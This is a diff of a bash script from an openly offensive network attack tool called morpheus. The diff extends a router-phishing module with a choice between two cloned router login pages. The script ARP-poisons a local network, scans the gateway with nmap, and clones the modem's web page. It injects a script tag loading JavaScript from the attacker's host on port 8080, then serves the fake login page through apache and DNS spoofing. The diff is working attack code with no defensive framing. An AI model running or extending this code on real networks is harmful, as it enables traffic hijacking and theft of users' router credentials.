@@ -48,18 +48,6 @@ Reset="${Escape}[0m";
 
 
 
-###
-# DEBUG SCRIPT OF MORPHEUS
-###
-Colors;
-if [ -e morpheus.sh ]; then
- :
-else
-echo ${RedF}[x]${white} Copy [${GreenF} me ${white}] to morpheus main folder and execute [${GreenF} me ${white}] from there ..${Reset};
-echo ${RedF}[x]${white} Also remmenber to config the settings File to store logfiles ..${Reset};
-exit
-fi
-
 
 # ---------------------
 # Variable declarations
@@ -1733,17 +1721,23 @@ echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
 rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270)
 gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
 
+# chose what phishing webpage to use
+PHiS=$(zenity --list --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Chose phishing webpage to use" --radiolist --column "Pick" --column "Option" TRUE "default" FALSE "new one" --width 300 --height 180)
+
+
 
   # retrieve info about modem to inject into clone
   echo ${BlueF}[☠]${white} Gather Info about modem webpage${RedF}! ${Reset};
   nmap -sV -PN -p 80 $GaTe > $IPATH/output/retrieve.log
   # InjE=`cat $IPATH/output/retrieve.log | egrep -m 1 "open" | awk {'print $4,$5,$6'}`
   InjE=`cat $IPATH/output/retrieve.log | egrep -m 1 "open" | cut -d '(' -f2 | cut -d ')' -f1` # it does not grep all servernames :(
+  MaCa=`cat $IPATH/output/retrieve.log | egrep -m 1 "MAC" | awk {'print $3'}` # grab mac address ..
   # check if nmap have retrieved any string from scan
   if [ -z "$InjE" ]; then
   echo ${RedF}[x] Module cant gather Info about modem webpage! ${Reset};
   echo "${RedF}[x]${white} Using:${GreenF} 'broadband router'${white} as server name${RedF}!"
   InjE="broadband router"
+  MaCa="8A:17:62:35:22:UA"
   fi
 
 
@@ -1751,13 +1745,30 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
   cd $IPATH/bin/phishing/router-modem
   cp index.html index.rb
   cp login.html login.rb
+  # chose 2º phishing webpage to use
+  if [ "$PHiS" = "new one" ]; then
+    cp new.html new.rb
+  fi
 
   # grab modem ip addr
   MIP=`route -n | grep "UG" | awk {'print $2'} | tr -d '\n'`
-  sed -i "s/MoDemIP/$MIP/" login.html
+  # chose 2º phishing webpage to use
+  if [ "$PHiS" = "new one" ]; then
+    sed -i "s/MoDemIP/$MIP/" new.html
+    sed -i "s/MaCa/$MaCa/" new.html
+    sed -i "s/MoDemIP/$MIP/" login.html
+  else
+    sed -i "s/MoDemIP/$MIP/" login.html
+  fi
   echo ${BlueF}[☠]${white} Inject javascript Into clone webpage${RedF}!${Reset};
   sleep 1
-  sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" index.html > copy.html
+
+  # chose 2º phishing webpage to use
+  if [ "$PHiS" = "new one" ]; then
+    sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" new.html > copy.html
+  else
+    sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" index.html > copy.html
+  fi
   mv copy.html index.html
   sed -i "s|GatWa|$GaTe|g" index.html
   sed -i "s|DiSpt|$InjE|g" index.html
@@ -1815,6 +1826,7 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
   mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns
   mv $IPATH/bin/phishing/router-modem/index.rb $IPATH/bin/phishing/router-modem/index.html
   mv $IPATH/bin/phishing/router-modem/login.rb $IPATH/bin/phishing/router-modem/login.html
+  mv $IPATH/bin/phishing/router-modem/new.rb $IPATH/bin/phishing/router-modem/new.html
   mv /tmp/etter.dns $Edns
   rm $IPATH/output/retrieve.log
   rm $ApachE/index.html
